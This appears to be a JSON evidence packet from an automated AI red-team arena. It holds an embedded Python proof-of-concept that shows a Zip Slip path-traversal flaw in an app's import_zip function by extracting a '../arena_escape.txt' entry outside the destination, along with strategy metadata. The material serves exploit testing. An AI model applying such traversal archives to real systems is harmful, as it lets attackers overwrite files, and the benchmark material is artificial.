@@ -1,0 +1,48 @@
+{
+  "derived_from": {
+    "parent_artifact_sha256": "606075ffac0e4d613b761955f38f33bc89cbdf598dd14962fe40f0562c619c3c",
+    "parent_lane_id": "payload-857-red-1",
+    "parent_materialized_receipt_sha256": "fee52829166a7d8065018ac57daf06671a0128492d8c79cb3e888f7b754c29b3",
+    "parent_scillm_call_receipt_sha256": "3580b622b1a3ccfa8f5ddb5a93786077402a03f31adef4323d71dc9ae1c00a99",
+    "parent_strategy_genome_sha256": "da599378194e54c1f3392d841baf09d4859f854a2b49b665df5fbf3e512532d4",
+    "parent_subagent_receipt_id": "tau-parent-subagent:red-1",
+    "parent_subagent_receipt_sha256": "b2ee07d4070aacc0e15a77ab31aebddad4803d7a519e2fe72fb0c6d8dc48c52b",
+    "parent_worker_id": "red-1",
+    "pressure_receipt_id": null,
+    "spawn_decision_receipt_id": null
+  },
+  "g2_selection_feedback": null,
+  "generation": 2,
+  "judge_observations": null,
+  "parent_exploit_py": "#!/usr/bin/env python3\n\"\"\"\nRed exploit for battle-004: demonstrates Zip Slip path traversal in import_zip.\nExecuted by judge as: python red_exploit_submission.py --expect-vulnerable\n\"\"\"\n\nimport argparse\nimport importlib\nimport sys\nimport tempfile\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\nmodule = importlib.import_module(\"app\")\nimport_zip = getattr(module, \"import_zip\")\n\nCONFIRMATION = \"RED_EXPLOIT_CONFIRMED\"\n\n\ndef build_traversal_zip(zip_path: Path, entry_name: str, payload: bytes) -> None:\n    with ZipFile(zip_path, \"w\") as zf:\n        zf.writestr(entry_name, payload)\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--expect-vulnerable\", action=\"store_true\")\n    args = parser.parse_args()\n\n    payload = b\"zip-slip traversal evidence\\n\"\n\n    with tempfile.TemporaryDirectory(prefix=\"red_zip_slip_\") as tmp:\n        root = Path(tmp).resolve()\n        destination = root / \"import_workspace\"\n        zip_path = root / \"payload.zip\"\n        escape_file = root / \"arena_escape.txt\"\n\n        if escape_file.exists():\n            escape_file.unlink()\n\n        build_traversal_zip(zip_path, \"../arena_escape.txt\", payload)\n\n        try:\n            import_zip(str(zip_path), str(destination))\n        except Exception as exc:\n            if args.expect_vulnerable:\n                print(f\"import_zip raised unexpectedly: {exc}\", file=sys.stderr)\n                return 1\n            return 0\n\n        vulnerable = escape_file.exists() and escape_file.read_bytes() == payload\n        inside_control = destination / \"arena_escape.txt\"\n        escaped_outside_destination = escape_file.resolve().parent == root and not inside_control.exists()\n\n        if args.expect_vulnerable:\n            if vulnerable and escaped_outside_destination:\n                print(CONFIRMATION)\n                return 0\n            print(\"Traversal write was not observed outside destination\", file=sys.stderr)\n            return 1\n\n        return 0 if not vulnerable else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n",
+  "parent_pressure": null,
+  "parent_strategy_genome": {
+    "expected_observation": "When run with --expect-vulnerable against the provided app.py, import_zip writes arena_escape.txt in the temporary parent directory outside the destination, the script prints RED_EXPLOIT_CONFIRMED, and exits 0.",
+    "mutation_origin": "Parent-relative method_replace on app_load_mode from direct from app import import_zip to dynamic importlib module loading, based only on public app.py and parent evidence packet.",
+    "parameters": {
+      "app_load_mode": "importlib.import_module('app') plus getattr(module, 'import_zip')",
+      "confirmation_token": "RED_EXPLOIT_CONFIRMED",
+      "destination_subdir": "import_workspace",
+      "payload": "zip-slip traversal evidence\\n",
+      "zip_entry": "../arena_escape.txt"
+    },
+    "rejected_methods": [
+      "HTTP endpoint probing",
+      "Network sockets or localhost assumptions",
+      "Third-party packages",
+      "Shelling out to zip utilities",
+      "Relying only on returned written paths without filesystem verification"
+    ],
+    "selected_methods": [
+      "Dynamic local import of app module via importlib.import_module and getattr for import_zip",
+      "Construct ZIP archive with ../ path traversal member",
+      "Use tempfile workspace to make outside-destination verification deterministic",
+      "Check exact payload bytes in escaped file",
+      "Print RED_EXPLOIT_CONFIRMED only when vulnerable behavior is observed"
+    ]
+  },
+  "public_scenario_constraints": {},
+  "schema": "battle.parent_evidence_packet.v1",
+  "sha256": "cea96db914ea41713d5f42c2c01608aabbe4e3b775ed76af1d9efaf46966263d",
+  "spawn_type": "post_block_handoff"
+}
